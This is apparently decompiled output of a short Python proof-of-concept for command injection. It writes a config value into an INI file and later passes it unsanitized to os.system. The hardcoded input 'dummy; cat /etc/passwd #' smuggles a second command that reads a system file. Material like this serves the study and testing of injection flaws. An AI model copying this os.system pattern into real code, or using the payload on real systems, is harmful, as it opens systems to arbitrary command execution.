# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 847_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 857 bytes


def create_config(user_input):
    config_content = f"[settings]\nuser_setting={user_input}"
    with open("vulnerable_config.ini", "w") as config_file:
        config_file.write(config_content)


def run_with_config():
    import configparser
    config = configparser.ConfigParser()
    config.read("vulnerable_config.ini")
    user_setting = config["settings"]["user_setting"]
    import os
    os.system(f"echo {user_setting}")


malicious_input = "dummy; cat /etc/passwd #"
create_config(malicious_input)
run_with_config()

# okay decompiling 847_1.pyc
